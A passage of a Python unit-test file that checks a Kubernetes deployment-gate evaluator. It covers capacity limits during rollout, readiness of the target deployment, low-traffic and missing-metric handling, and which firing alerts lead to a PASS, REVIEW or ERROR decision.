        old = clone(base_resources())
        new = clone(base_resources())
        for resources, cpu in ((old, "1000m"), (new, "900m")):
            deployment = resources[0]
            deployment["spec"]["replicas"] = 4
            container = deployment["spec"]["template"]["spec"]["containers"][0]
            container["resources"]["requests"] = {"cpu": cpu, "memory": "256Mi"}
            container["resources"]["limits"] = {"cpu": "2000m", "memory": "512Mi"}
        evidence = base_evidence(available_cpu_millicores=4600, available_memory_bytes=4096 * MI)
        evidence["deployment"]["containers"][0]["resources"]["requests"] = {
            "cpu": "1000m",
            "memory": "256Mi",
        }
        result = evaluate(old, new, evidence, base_config(), base_context())
        self.assertEqual(result["decision"], "REVIEW")
        self.assertIn("CAPACITY_INSUFFICIENT", rule_ids(result))
        audit = result["audit"]["capacity"]
        self.assertEqual(audit["retained_old_replicas"], 4)
        self.assertEqual(audit["peak_demo_cpu_millicores"], 4900)


class TargetAndTelemetryTests(unittest.TestCase):
    def test_offline_or_zero_ready_target_never_passes(self) -> None:
        for ready, available in ((0, 0), (0, 1), (1, 0)):
            with self.subTest(ready=ready, available=available):
                evidence = base_evidence()
                evidence["deployment"].update(
                    {"ready_replicas": ready, "available_replicas": available}
                )
                result = evaluate(base_resources(), base_resources(), evidence, base_config(), base_context())
                self.assertNotEqual(result["decision"], "PASS")
                self.assertTrue({"TARGET_NOT_READY", "TARGET_DEGRADED"} & rule_ids(result))

    def test_missing_target_evidence_is_error(self) -> None:
        evidence = base_evidence()
        evidence["deployment"] = {}
        result = evaluate(base_resources(), base_resources(), evidence, base_config(), base_context())
        self.assertEqual(result["decision"], "ERROR")
        self.assertIn("TARGET_EVIDENCE_MISSING", rule_ids(result))

    def test_zero_rate_with_fresh_sources_is_review_not_metric_error(self) -> None:
        evidence = base_evidence(request_rate=0.0, error_ratio=None, p95=None)
        result = evaluate(base_resources(), base_resources(), evidence, base_config(), base_context())
        self.assertEqual(result["decision"], "REVIEW")
        self.assertIn("LOW_TRAFFIC", rule_ids(result))
        self.assertNotIn("METRIC_MISSING_OR_INVALID", rule_ids(result))
        self.assertNotIn("EVIDENCE_ERROR", rule_ids(result))

    def test_zero_rate_with_missing_counter_or_histogram_source_errors(self) -> None:
        for missing in ("requests_total", "latency_bucket", "up"):
            with self.subTest(missing=missing):
                evidence = base_evidence(request_rate=0.0, error_ratio=None, p95=None)
                evidence["metrics"]["series_presence"][missing] = False
                result = evaluate(base_resources(), base_resources(), evidence, base_config(), base_context())
                self.assertEqual(result["decision"], "ERROR")
                self.assertIn("LOW_TRAFFIC_SOURCE_MISSING", rule_ids(result))

    def test_target_up_down_reviews(self) -> None:
        evidence = base_evidence()
        evidence["metrics"]["up"] = 0.0
        result = evaluate(base_resources(), base_resources(), evidence, base_config(), base_context())
        self.assertEqual(result["decision"], "REVIEW")
        self.assertIn("TARGET_UP_NOT_READY", rule_ids(result))

    def test_watchdog_ignored_but_global_resource_alert_reviews(self) -> None:
        watchdog = base_evidence(
            alerts=[{"name": "Watchdog", "state": "firing", "labels": {"alertname": "Watchdog", "severity": "none"}}]
        )
        result = evaluate(base_resources(), base_resources(), watchdog, base_config(), base_context())
        self.assertEqual(result["decision"], "PASS")

        global_alert = base_evidence(
            alerts=[
                {"name": "KubeCPUOvercommit", "state": "firing", "labels": {"alertname": "KubeCPUOvercommit"}},
                {"name": "Watchdog", "state": "firing", "labels": {"alertname": "Watchdog", "severity": "none"}},
            ]
        )
        result = evaluate(base_resources(), base_resources(), global_alert, base_config(), base_context())
        self.assertEqual(result["decision"], "REVIEW")
        self.assertIn("FIRING_ALERTS", rule_ids(result))
        finding = next(f for f in result["findings"] if f["rule_id"] == "FIRING_ALERTS")
        self.assertEqual(finding["evidence"]["count"], 1)


if __name__ == "__main__":
    unittest.main()
